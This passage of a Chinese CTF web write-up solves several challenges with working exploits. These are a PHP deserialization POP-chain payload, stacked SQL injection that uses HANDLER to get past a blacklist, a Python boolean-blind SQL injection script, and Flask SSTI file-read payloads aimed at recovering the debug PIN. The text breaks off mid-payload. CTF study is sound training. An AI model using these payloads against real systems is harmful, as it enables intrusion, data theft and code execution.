$CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>update.php</code>得知，只要用admin登陆成功，即可获得flag。</p><p>核心代码在<code>lib.php</code>找反序列化点，在<code>User</code>类内：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br></pre></td></tr></table></figure><p>发现下面定义中，<code>$age</code>和<code>$nickname</code>是可控的，其将Info对象序列化后经过<code>safe()</code>函数处理返回给<code>update()</code>进行反序列化。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>safe函数</code>, 将很多SQL的关键字过滤，替换为<code>hacker</code>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将关键字换成<code>hacker</code>, 导致长度发生变化（变长），可以进一步进行字符逃逸，然后注入对象。</p><p>在update.php内发现实例化了User并且调用了<code>User-&gt;update()</code>进行反序列化等操作，如果登录成功则输出flag：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>User</code>对象，可以看到<code>__toString()</code>魔术方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>来到<code>UpdateHelper</code>类，发现会把sql给<code>echo()</code>出来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果<code>$sql = new User()</code>的话，就会触发User内的<code>__toString()</code>魔术方法，该魔术方法内调用了<code>$nickname</code>属性的<code>update()</code>方法。虽然<code>dbCtrl</code>对象拥有<code>update()</code>方法，但真正是自己做的题的话就会发现，若<code>$nickname</code>实例化成个对象没意义，那个<code>update()</code>方法完全是障眼法，只能继续看。</p><p>可以发现Info类内有<code>__Call()</code>魔术方法，如果调用了一个不存在的属性，<code>__Call()</code>方法就会触发，正好Info类没有<code>update()</code>方法，如果User内的<code>$nickname</code>实例化为Info对象，调用不存在的<code>update()</code>就会触发这个<code>__Call()</code>，这个<code>__Call()</code>魔术方法将<code>Ctrlcase</code>的<code>login()</code>函数结果输出出来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就很明显了，要把<code>$this-&gt;CtrlCase</code>实例化成<code>dbCtrl</code>对象，调用dbCtrl对象内的<code>login()</code>方法，跟进：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br></pre></td></tr></table></figure><p>发现它正好把SQL的结果给返回了，这样整个pop链基本就理清楚了：</p><p>利用<code>UpdateHelper</code>的<code>__destruct</code>触发<code>User</code>的<code>__toString</code>然后走到<code>Info</code>的<code>__call</code>方法，在<code>__call</code>中调用了<code>dbCtrl</code>类的<code>login</code>方法，通过控制查询语句，把admin账户的密码查出来。</p><p>注意前面的内容中标注了有3个属性，为了保证属性一致，在payload前面加上CtrlCase的内容，然后在最后闭合语句，使<code>unserialize</code>忽略掉后面的<code>CtrlCase</code></p><p>还需要在<code>nickname</code>中插入足量的黑名单字符，把payload挤出去。</p><p>POC</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age= <span class="string">&#x27;select password,id from user where username=?&#x27;</span>; <span class="comment">//要把id放password后面</span></span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $token = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$v0w = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$v0w-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">$v0w-&gt;sql-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">$v0w-&gt;sql-&gt;nickname-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line"></span><br><span class="line">$v0w = <span class="string">&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;</span> . serialize($v0w) . <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">$length = strlen($v0w);</span><br><span class="line">$v0w = str_repeat(<span class="string">&#x27;union&#x27;</span>, $length).$v0w;</span><br><span class="line"><span class="keyword">echo</span>($v0w);</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后到网站的<code>update.php</code></p><p>POST: <code>age=1&amp;nickname=payload</code></p><p>得到admin密码的md5</p><p><img src="https://i.loli.net/2020/02/25/rdiGkDAlU82Y1FP.png"></p><p>解密后得到密码：<code>yingyingying</code>，登陆admin，得到flag</p><p><img src="https://i.loli.net/2020/02/25/gPY3R4H5ImdGsUZ.png"></p><h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>应该是一个<code>sqlshell</code>，进行<code>union select</code>时，给出<code>balcklist</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure><p>想办法进行绕过。</p><p>查表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show tables;#</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;FlagHere&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show columns from FlagHere;#</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MySQL有一个handler的可以代替select进行查询，payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; handler FlagHere open as v; handler v read first; handler v close;#</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(42) &quot;flag&#123;d9a362a0-3c8a-4f0e-b4fd-880287d5be73&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>预备知识：</p><blockquote><p>对MYSQL注入相关内容及部分Trick的归类小结  <a href="https://xz.aliyun.com/t/7169#toc-50">https://xz.aliyun.com/t/7169#toc-50</a></p><p>聊一聊bypass information_schema  <a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p></blockquote><p>这个题看了P3rh4ps、rdd师傅的wp和微笑师傅的官方wp：</p><blockquote><p>P3: <a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p>rdd: <a href="https://blog.csdn.net/qq_40648358/article/details/104456748">https://blog.csdn.net/qq_40648358/article/details/104456748</a></p><p>smi1e:<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p></blockquote><p>刚开始还好，fuzz发现：</p><ul><li>过滤了and or关键字</li><li>过滤了if</li><li>不能用information_schema</li><li>没有单独过滤union和select, 但是过滤了union select，union某某某select之类</li><li>过滤了sys.schema_auto_increment_columns </li><li>过滤了join</li></ul><p>fuzz还发现：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">返回Hello CQGAME</span><br><span class="line">2||1&#x3D;1</span><br><span class="line">返回Hello Nu1L</span><br><span class="line">2||1&#x3D;5</span><br><span class="line">返回Hello CQGAME</span><br></pre></td></tr></table></figure><p>也就是说，本来2查询的是CQGAME，如果<code>||</code>后面的表达式为True则返回Nu1L、false则返回CQGAME。继续测试：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||substr((select 1),1,1)&#x3D;2</span><br><span class="line">Hello CQGAME</span><br><span class="line">2||substr((select 1),1,1)&#x3D;1</span><br><span class="line">Hello Nu1L</span><br></pre></td></tr></table></figure><p>说明可以布尔盲注。</p><p>这里抄了一下<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/">smi1e师傅的payload</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp1</span>():</span></span><br><span class="line">    str1 = (<span class="string">&#x27;0123456789&#x27;</span>+string.ascii_letters+string.punctuation).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    select = <span class="string">&#x27;select group_concat(table_name) from sys.x$schema_flattened_keys&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            paylaod = <span class="string">&quot;1/**/&amp;&amp;/**/(select substr((&#123;&#125;),&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;&quot;</span>.format(select, j, i)</span><br><span class="line">            <span class="comment">#print(paylaod)</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp2</span>():</span></span><br><span class="line">    str1 = (<span class="string">&#x27;-0123456789&#x27;</span>+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag_table_name = <span class="string">&#x27;f1ag_1s_h3r3_hhhhh&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            i = flag+i</span><br><span class="line">            paylaod = <span class="string">&quot;1&amp;&amp;((select 1,concat(&#x27;&#123;&#125;~&#x27;,CAST(&#x27;0&#x27; as json))) &lt; (select * from &#123;&#125; limit 1))&quot;</span>.format(i,flag_table_name)</span><br><span class="line">            <span class="comment">#print(paylaod)</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag=i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp1()</span><br><span class="line">    exp2()</span><br></pre></td></tr></table></figure><h1 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h3><p>进入网站y有两个功能：Base64编码，解码。在解码功能中，输入非法字符串，将会出现错误，可以进入debug模式。<br><img src="https://i.loli.net/2020/02/25/Co6Ls8Oqn3biYZR.png"></p><p>但是需要PIN码，这里涉及到一个知识<a href="https://xz.aliyun.com/t/2553">Flask debug pin安全问题</a></p><p>这个PIN码并不安全，如果可以得到一些信息，就可以计算出来。如果可以读取出这些信息，计算出PIN码，就可以进入debug模式，可以RCE解决问题。</p><p>测试发现解密处存在Flask的SSTI，可以利用SSTI进行任意文件读取（由于不知道flag位置和文件名，只能去读已知的文件）。<br>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;想要读取的文件&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br></pre></td></tr></table></figure><p><strong>获取machine-id</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span 